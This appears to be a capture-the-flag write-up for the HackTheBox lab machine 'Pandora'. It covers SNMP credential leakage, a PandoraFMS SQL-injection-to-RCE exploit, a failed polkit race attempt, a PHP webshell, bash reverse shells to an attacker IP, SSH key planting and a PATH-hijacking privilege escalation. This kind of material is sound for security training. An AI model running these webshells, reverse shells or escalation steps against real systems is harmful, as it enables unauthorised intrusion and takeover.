---
layout: post
title: "pandora"
date: 2025-10-05 
categories: OSCP Playlist
---
# pandora

# Summary

- nmap UDP scan to find snmp; reveal community string public
- snmpwalk to find daniel ssh login
- apache configuration file to find vhost hosted on localhost; local port forward 80
- pandoraFMS found on vhost; vulnerable version; unauthenticated RCE from SQLi
- upload webshell; execute reverse shell; inject host’s ssh public key in matt’s .ssh dir to get ssh session
- find SUID file; full path of tar not used; inject PATH variable
- make custom binary reverse shell to get root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/pandora 10.10.11.136

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We learn that the backend is ubuntu, Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/pandora/image.png)

It’s a network monitoring solution. We also see Panda.HTB. Let’s add that to our /etc/hosts file:

```bash
10.10.11.136 Panda.HTB
```

There is a contact function, but all it does is send a GET request with HTTP parameters to the home page:

![image.png]({{ site.baseurl }}/assets/pandora/image%201.png)

Let’s start fuzzing. Let’s also fuzz for .php files since it’s using apache:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://Panda.HTB/FUZZ -ic -e .php

assets
```

Nothing. Let’s see if there are any subdomains:

```bash
ffuf -u http://10.10.11.136 -H "Host: FUZZ.Panda.HTB" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 33560
```

Nothing. Let’s do another port scan:

```bash
sudo nmap -p- 10.10.11.136 -v --min-rate=10000
```

Nothing. 

## UDP scan and SNMPwalk

Let’s check UDP now:

```bash
sudo nmap -sU 10.10.11.136 -sC -sV -oN nmap/pandora_UDP

161/udp open   snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-netstat:
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:57286   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
<SNIP>
```

Seems like there’s SNMP running on the server with the community string public. Let’s use snmpwalk to uncover more information:

```bash
snmpwalk -v1 -c public 10.10.11.136 

iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"                              iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10       
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"                                                                                                         
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"                                                                                                        
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"                                                                                                    
iso.3.6.1.2.1.1.7.0 = INTEGER: 72        

iso.3.6.1.2.1.25.4.2.1.5.1102 = STRING: "-u daniel -p HotelBabylon23" 

iso.3.6.1.2.1.25.4.2.1.5.696 = STRING: "--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only"                   
iso.3.6.1.2.1.25.4.2.1.5.704 = STRING: "--foreground"                                                                                          
iso.3.6.1.2.1.25.4.2.1.5.705 = STRING: "/usr/bin/networkd-dispatcher --run-startup-triggers"                                                   
iso.3.6.1.2.1.25.4.2.1.5.712 = STRING: "-n -iNONE"                                                                                             
iso.3.6.1.2.1.25.4.2.1.5.713 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.716 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.717 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.725 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.799 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.823 = STRING: "-f"                                                                                                    
iso.3.6.1.2.1.25.4.2.1.5.834 = STRING: "-f"                                                                                                    
iso.3.6.1.2.1.25.4.2.1.5.835 = STRING: "-f"                                                                                                    
iso.3.6.1.2.1.25.4.2.1.5.836 = STRING: "-LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f -p /run/snmpd.pid"            
iso.3.6.1.2.1.25.4.2.1.5.857 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"                           
iso.3.6.1.2.1.25.4.2.1.5.863 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.891 = STRING: "--no-debug"                                                                                            
iso.3.6.1.2.1.25.4.2.1.5.917 = STRING: "-o -p -- \\u --noclear tty1 linux"                                                                     
iso.3.6.1.2.1.25.4.2.1.5.973 = ""                                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.974 = STRING: "-k start"                                                                                              
iso.3.6.1.2.1.25.4.2.1.5.1102 = STRING: "-u daniel -p HotelBabylon23"       
```

## Foothold

We potentially have a credential. Let’s try daniel:

```bash
ssh daniel@10.10.11.136

#HotelBabylon23
```

We are in:

![image.png]({{ site.baseurl }}/assets/pandora/image%202.png)

Initial Enumeration:

![image.png]({{ site.baseurl }}/assets/pandora/image%203.png)

Checking open ports:

```bash
ss -lntp
State           Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process          
LISTEN          0                80                             127.0.0.1:3306                          0.0.0.0:*                              
LISTEN          0                4096                       127.0.0.53%lo:53                            0.0.0.0:*                              
LISTEN          0                128                              0.0.0.0:22                            0.0.0.0:*                              
LISTEN          0                511                                    *:80                                  *:*                              
LISTEN          0                128                                 [::]:22                               [::]:*   
```

Let’s try and log in to mysql:

```bash
mysql -u daniel -h localhost -p

ERROR 1045 (28000): Access denied for user 'daniel'@'localhost' (using password: YES)
```

Let’s check running processes:

```bash
ps -ef --forest

root         823       1  0 Oct04 ?        00:00:00 /usr/sbin/cron -f
root         834     823  0 Oct04 ?        00:00:00  \_ /usr/sbin/CRON -f
root         857     834  0 Oct04 ?        00:00:00      \_ /bin/sh -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
root        1102     857  0 Oct04 ?        00:00:00          \_ /usr/bin/host_check -u daniel -p HotelBabylon2

root         705       1  0 Oct04 ?        00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers  
```

Let’s run linpeas

```bash

Vulnerable to CVE-2021-3560

root         974  0.0  0.7 228068 31492 ?        Ss   Oct04   0:03 /usr/sbin/apache2 -k start
www-data    8866  0.0  0.3 228500 13668 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    8867  0.0  0.3 228500 13668 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    8868  0.0  0.3 228500 13668 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    8869  0.0  0.3 228500 13668 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice
www-data    8870  0.0  0.3 228500 13668 ?        S    00:00   0:00  _ /usr/sbin/apache2 -k start
  └─(Caps) 0x00000000008000c4=cap_dac_read_search,cap_setgid,cap_setuid,cap_sys_nice

══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 May 26  2021 /usr/bin/pkexec
pkexec version 0.105

══╣ Logged in users (utmp)                                                                                                                     
           system boot  2025-10-04 16:31                                                                                                       
           run-level 5  2025-10-04 16:31                                                                                                       
LOGIN      tty1         2025-10-04 16:31               917 id=tty1                                                                             
           pts/0        2025-10-05 11:10             11242 id=ts/0  term=0 exit=0                                                              
daniel   + pts/1        2025-10-05 17:03   .         41219 (10.10.16.9)  0.105

lrwxrwxrwx 1 root root 31 Dec  3  2021 /etc/apache2/sites-enabled/pandora.conf -> ../sites-available/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions
tmux 3.0a

/tmp/tmux-1001

/home/
/home/matt/user.txt
/root/

╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                     
total 16K                                                                                                                                      
drwxr-xr-x  4 root root 4.0K Dec  7  2021 .                                                                                                    
drwxr-xr-x 14 root root 4.0K Dec  7  2021 ..
drwxr-xr-x  3 root root 4.0K Dec  7  2021 html                                                                                                 
drwxr-xr-x  3 matt matt 4.0K Dec  7  2021 pandora  

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation        -rw-r--r-- 1 matt matt 1263 Jan  3  2020 /var/www/pandora/pandora_console/Dockerfile  

-rw-r--r-- 1 root root 14844 Mar  4  2020 /usr/share/php/DB/storage.php

```

Let’s add the new found pandora subdomain to our /etc/hosts, but it should be the same site since it’s hosted on port 80:

![image.png]({{ site.baseurl }}/assets/pandora/image%204.png)

We see from our enumeration that the box is vulnerable to CVE-2021-3560. 

Polkit (formerly PolicyKit) controls **which unprivileged users can run privileged commands** — for example, when a desktop action needs root privileges but asks for a password confirmation.

It sits between user applications and privileged system services (like `systemd`), enforcing access control. It’s a **race condition** in the `pkexec` command (a Polkit component similar to `sudo`).

Let’s try this exploit: https://www.exploit-db.com/exploits/50011

Does not work. Weird formatting error?

```bash
./exploit.sh 

./exploit.sh: line 10: $'\r': command not found ./exploit.sh: line 12: $'\r': command not found ./exploit.sh: line 16: $'\r': command not found ./exploit.sh: line 18: $'\r': command not found ./exploit.sh: line 19: $'\r': command not found ./exploit.sh: line 23: $'\r': command not found ./exploit.sh: line 50: syntax error in conditional expression '/exploit.sh: line 50: syntax error near ]] '/exploit.sh: line 50: while [[ $userid == "" ]]
```

This is the classic **Windows CRLF (`\r\n`) vs Unix LF (`\n`)** problem. Your script contains carriage return characters (`\r`) at line ends, which the shell sees as characters and tries to execute. Let’s reformat:

```bash
dos2unix exploit.sh
```

Let’s try again:

```bash
./exploit.sh

[*] Vulnerable version of polkit found
[*] Determining dbus-send timing
[*] Attempting to create account

```

Did not work.

Let’s go on the official site and try to follow manual exploitation:

[https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/](https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/)

The vulnerability is triggered by starting a `dbus-send` command but killing it while polkit is still in the middle of processing the request.

First, we have to measure how long it takes to run dbus-send:

```bash
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1

Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required

real    0m0.007s
user    0m0.000s
sys     0m0.002s
```

0.007s.

Need to kill dbus-send command after half of that:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.0045s ; kill $!
```

Let’s see if our user had been created:

```bash
id boris
```

Does not work. Trying to fuzz the time sleeping also did not work. 

Going back to the apache conf, turns out, the subdomain is bound only to the localhost. Let’s local port forward 80:

```bash
~C #in the ssh session
-L 80:localhost:80
```

![image.png]({{ site.baseurl }}/assets/pandora/image%205.png)

We are now on the pandora console. We see the version on the bottom of the page as well:

```bash
v7.0NG.742_FIX_PERL2020
```

Let’s find default password for pandoraFMS

![image.png]({{ site.baseurl }}/assets/pandora/image%206.png)

We try to login with default credentials:

```bash
root:pandora
admin:pandora
```

Did not work. Let’s try to connect to mysql:

```bash
mysql -u root -h localhost -p
```

Did not work.

Searching up exploit related to the associated version, we find this github page:

[https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

Let’s try it out:

```bash
python3 sqlpwn.py -t localhost:80
```

![image.png]({{ site.baseurl }}/assets/pandora/image%207.png)

We now have RCE. Let’s get a reverse shell back. Executing reverse shell on the exploit does not work. Let’s use the Admin Session Cookie to login:

```bash
URL:  http://localhost:80/pandora_console
[+] Sending Injection Payload
[+] Requesting Session
[+] Admin Session Cookie : j474kqhp5b1stqt7lebg1kcuql
[+] Sending Payload 
[+] Respose : 200
[+] Pwned :)
[+] If you want manual Control : http://localhost:80/pandora_console/images/pwn.php?test=

```

![image.png]({{ site.baseurl }}/assets/pandora/image%208.png)

Now refresh the page. We are in:

![image.png]({{ site.baseurl }}/assets/pandora/image%209.png)

Now we upload our php webshell file. First create it:

```bash

<?php system($_REQUEST["cmd"]); ?>

```

![image.png]({{ site.baseurl }}/assets/pandora/image%2010.png)

Now just visit our page:

```bash
http://localhost:80/pandora_console/images/web.php?cmd=id
```

![image.png]({{ site.baseurl }}/assets/pandora/image%2011.png)

Now let’s capture the request on burp, and send a POST request of our reverse shell:

```bash
cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.9/4444 0>&1'
```

Before we execute, we need to start our listener:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/pandora/image%2012.png)

We now have shell:

![image.png]({{ site.baseurl }}/assets/pandora/image%2013.png)

We could’ve also uploaded the file with the exploit like this:

```bash
python3 sqlpwn.py -t localhost:80 -f web.php
```

Let’s enumerate basic info:

![image.png]({{ site.baseurl }}/assets/pandora/image%2014.png)

Let’s find SUID binaries:

```bash
find / -perm -4000 -type f -ls 2>/dev/null

   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup

```

Let’s run it and see what it does:

```bash
/usr/bin/pandora_backup 

tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup failed!
Check your permissions!
```

Let’s transfer the binary back and decompile it in ghidra to see the functions. After ghira finished analysing:

```bash
bool main(void)

{
  __uid_t __euid;
  __uid_t __ruid;
  int iVar1;
  
  __euid = getuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  puts("PandoraFMS Backup Utility");
  puts("Now attempting to backup PandoraFMS client");
  iVar1 = system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*");
  if (iVar1 == 0) {
     puts("Backup successful!");
     puts("Terminating program!");
  }
  else {
     puts("Backup failed!\nCheck your permissions!");
  }
  return iVar1 != 0;
```

We realise the command used it not using a full path. This means we can inject our own PATH to the binary (path variable hijacking). What is also weird is that the binary should’ve ran with root privilge since it got it’s SUID set, yet we still didn’t have privilege to execute it. Maybe we are in a restricted shell. Let’s get a proper shell:

```bash
#Let's create a ssh key on attack host
ssh-keygen -f matt
cat matt.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJlcj2wy55Z6EifPcJLr3ywCBmvG77ZdAxeGRckIJAC5 kali@kali

#Now cat the content and echo it to authorized_keys on target host
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJlcj2wy55Z6EifPcJLr3ywCBmvG77ZdAxeGRckIJAC5 kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 matt #change to secure permission to allow use of private key

ssh -i matt matt@10.10.11.136

```

We now have proper ssh shell. Let’s test if we can run the binary now:

```bash
/usr/bin/pandora_backup 
```

![image.png]({{ site.baseurl }}/assets/pandora/image%2015.png)

Let’s change our PATH variable:

```bash
export PATH=/home/matt:$PATH

#now verify
env 

PATH=/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

```

Now let’s create our binary:

```bash
nano tar

#########CONTENT

#!/bin/bash
bash -i >& /dev/tcp/10.10.16.9/9001 0>&1
```

Now let’s change it’s permission, then start a listener and execute pandora_backup:

```bash
chmod +x tar

#on attack box
nc -lnvp 9001

#back on target
/usr/bin/pandora_backup
```

We now have root:

![image.png]({{ site.baseurl }}/assets/pandora/image%2016.png)